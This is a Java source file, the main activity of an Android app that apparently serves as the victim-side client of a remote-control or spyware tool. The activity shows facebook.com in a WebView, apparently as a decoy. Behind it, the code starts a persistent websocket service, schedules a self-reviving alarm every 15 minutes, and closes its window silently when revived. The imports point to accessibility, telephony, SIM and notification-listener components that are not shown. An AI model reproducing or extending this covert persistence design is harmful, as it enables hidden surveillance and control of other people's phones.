package com.lyrnic.userside.activities;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.lyrnic.userside.R;
import com.lyrnic.userside.broadcasts.AppReviver;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.managers.FilesManager;
import com.lyrnic.userside.managers.NumbersManager;
import com.lyrnic.userside.services.ActionsController;
import com.lyrnic.userside.services.NotificationListener;
import com.lyrnic.userside.services.WebsocketService;
import com.lyrnic.userside.utilities.AppLogsUtils;
import com.lyrnic.userside.utilities.PermissionsUtilities;
import com.lyrnic.userside.utilities.ServicesUtils;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    public void init() {
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main2), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        AppLogsUtils.saveAppLastOpenTime(this);

        boolean isRevivingTask = getIntent().getBooleanExtra("revive", false);

        if (isRevivingTask) {
            finishAffinity();
            return;
        }

        scheduleReviver(this);
        startWebsocketService();

        webView = findViewById(R.id.web_view);

        WebViewClient client = new WebViewClient();
        webView.setWebViewClient(client);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        webView.loadUrl("https://www.facebook.com");
    }



    private void startWebsocketService() {
        if (!ServicesUtils.isServiceKilled(this, WebsocketService.class)) {
            return;
        }
        Intent intent = new Intent(this, WebsocketService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, intent);
        } else {
            startService(intent);
        }
    }

    public synchronized static void scheduleReviver(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

        Intent intent = new Intent(context, AppReviver.class);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
        boolean scheduled = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 15, pendingIntent);
                scheduled = true;
            }
        } else {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000 * 60 * 15, pendingIntent);
            scheduled = true;
        }
        FilesManager.logStatus("alarm scheduled: " + scheduled);
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

}